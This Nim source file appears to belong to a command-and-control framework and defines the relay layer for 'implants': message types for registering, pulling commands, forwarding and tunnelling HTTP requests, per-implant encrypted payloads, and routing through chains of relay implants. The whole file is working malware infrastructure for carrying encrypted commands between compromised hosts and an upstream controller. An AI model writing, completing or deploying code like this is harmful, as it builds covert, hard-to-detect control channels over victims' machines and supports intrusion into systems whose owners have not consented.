import json, base64, times, sequtils, strutils, tables, random, net
import ../../util/[crypto, strenc]
import relay_config

# Message types for relay communication
type
    RelayMessageType* = enum
        REGISTER = "register"
        PULL = "pull"
        COMMAND = "command"
        RESPONSE = "response"
        FORWARD = "forward"
        HTTP_REQUEST = "http_request"
        HTTP_RESPONSE = "http_response"

    RelayMessage* = object
        msgType*: RelayMessageType
        fromID*: string
        route*: seq[string]
        id*: string
        payload*: string
        timestamp*: int64

    RelayImplant* = object
        id*: string
        isRelay*: bool
        upstreamHost*: string
        upstreamPort*: int
        downstreamPort*: int
        cryptoKey*: string
        registeredImplants*: Table[string, ImplantInfo]
        messageQueue*: seq[RelayMessage]
        isListening*: bool
        isConnected*: bool

    ImplantInfo* = object
        id*: string
        lastSeen*: int64
        route*: seq[string]

# Generate unique message ID
proc generateMessageID*(): string =
    randomize()
    result = $rand(1000000000..1999999999) & $epochTime().int64

# Serialize RelayMessage to JSON string
proc serialize*(msg: RelayMessage): string =
    let jsonObj = %*{
        "msgType": $msg.msgType,
        "fromID": msg.fromID,
        "route": msg.route,
        "id": msg.id,
        "payload": msg.payload,
        "timestamp": msg.timestamp
    }
    result = $jsonObj

# Deserialize JSON string to RelayMessage
proc deserialize*(jsonStr: string): RelayMessage =
    let jsonObj = parseJson(jsonStr)
    result.msgType = parseEnum[RelayMessageType](jsonObj["msgType"].getStr())
    result.fromID = jsonObj["fromID"].getStr()
    result.route = @[]
    for item in jsonObj["route"].getElems():
        result.route.add(item.getStr())
    result.id = jsonObj["id"].getStr()
    result.payload = jsonObj["payload"].getStr()
    result.timestamp = jsonObj["timestamp"].getInt()

# Encrypt payload using per-implant derived key
proc encryptPayload*(data: string, implantID: string): string =
    let implantKey = getImplantKey(implantID)
    result = encryptData(data, implantKey)

# Decrypt payload using per-implant derived key
proc decryptPayload*(encryptedData: string, implantID: string): string =
    let implantKey = getImplantKey(implantID)
    result = decryptData(encryptedData, implantKey)

# Create a new RelayMessage with per-implant encryption
proc createMessage*(msgType: RelayMessageType, fromID: string, route: seq[string], 
                   payload: string): RelayMessage =
    result.msgType = msgType
    result.fromID = fromID
    result.route = route
    result.id = generateMessageID()
    result.payload = encryptPayload(payload, fromID)  # Use sender's ID for key derivation
    result.timestamp = epochTime().int64

# Create REGISTER message
proc createRegisterMessage*(implantID: string, route: seq[string]): RelayMessage =
    let registerData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64,
        "capabilities": ["relay", "client"]
    }
    result = createMessage(REGISTER, implantID, route, $registerData)

# Create PULL message
proc createPullMessage*(implantID: string, route: seq[string]): RelayMessage =
    let pullData = %*{
        "implantID": implantID,
        "timestamp": epochTime().int64
    }
    result = createMessage(PULL, implantID, route, $pullData)

# Create HTTP_REQUEST message
proc createHttpRequestMessage*(fromID: string, route: seq[string], 
                              httpMethod: string, path: string, headers: seq[(string, string)], 
                              body: string = ""): RelayMessage =
    # Convert headers to JSON-compatible format
    var headerObj = newJObject()
    for (key, value) in headers:
        headerObj[key] = %value
    
    let httpData = %*{
        "method": httpMethod,
        "path": path,
        "headers": headerObj,
        "body": body,
        "timestamp": epochTime().int64
    }
    result = createMessage(HTTP_REQUEST, fromID, route, $httpData)

# Create HTTP_RESPONSE message (simplified version with JSON payload)
proc createHttpResponseMessage*(fromID: string, route: seq[string], 
                               responseJson: string): RelayMessage =
    result = createMessage(HTTP_RESPONSE, fromID, route, responseJson)

# Initialize relay implant
proc initRelayImplant*(implantID: string): RelayImplant =
    result.id = implantID
    result.isRelay = false
    result.upstreamHost = ""
    result.upstreamPort = 0
    result.downstreamPort = 0
    result.cryptoKey = getImplantKey(implantID)  # Use derived key
    result.registeredImplants = initTable[string, ImplantInfo]()
    result.messageQueue = @[]
    result.isListening = false
    result.isConnected = false

# Validate message integrity
proc validateMessage*(msg: RelayMessage): bool =
    result = msg.id != "" and msg.fromID != "" and msg.route.len > 0 and 
             msg.timestamp > 0 and msg.payload != "" 